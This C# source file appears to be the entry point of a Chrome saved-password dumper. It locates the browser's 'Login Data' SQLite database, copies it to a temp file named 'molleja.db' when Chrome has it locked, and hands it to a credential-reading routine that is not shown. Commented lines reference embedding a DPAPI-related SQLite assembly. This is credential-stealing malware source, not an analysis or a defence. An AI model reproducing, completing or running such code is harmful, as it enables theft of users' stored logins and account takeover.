using Community.CsharpSqlite.SQLiteClient;
using System;
using System.IO;
//using System.Reflection;

public class Chrome
{

    //static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
    //{
    //    return EmbeddedAssembly.Get(args.Name);
    //}


    static void Main(string[] args)
    {
        //Load assemblies
        //string resource1 = "DPAPI.System.Data.SQLite.DLL";
        //EmbeddedAssembly.Load(resource1, "System.Data.SQLite.dll");

        //AppDomain currentDomain = AppDomain.CurrentDomain;
        //currentDomain.AssemblyResolve += new ResolveEventHandler(CurrentDomain_AssemblyResolve);

        string db_way = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
                + "/Google/Chrome/User Data/Default/Login Data"; // a path to a database file
        int tryCount = 0;
        do
        {
            try
            {
                ProgramCode.LetsDothis(db_way);
                //This means all good
                tryCount += 10; //this should cause an exit
            }
            catch (SqliteException ex)
            {
                if( ex.SqliteErrorCode == (int)SqliteError.BUSY)
                {
                    //This means the database file is bussy (chrome must be opened)
                    string tmpFile = Path.GetTempPath() + "molleja.db";
                    if (tmpFile != db_way)
                    {
                        System.IO.File.Copy(db_way, tmpFile, true);
                        db_way = tmpFile;
                        //Lets try again                  
                    }
                }
                else
                {
                    //brup
                    Console.WriteLine(ex.Message);
                    break;
                }
                
                tryCount++;
            }
            catch(Exception ex)
            {

                Console.WriteLine(ex.Message);
                ex = ex.InnerException;
                break;
            }
        } while (tryCount < 2);
        



    }

}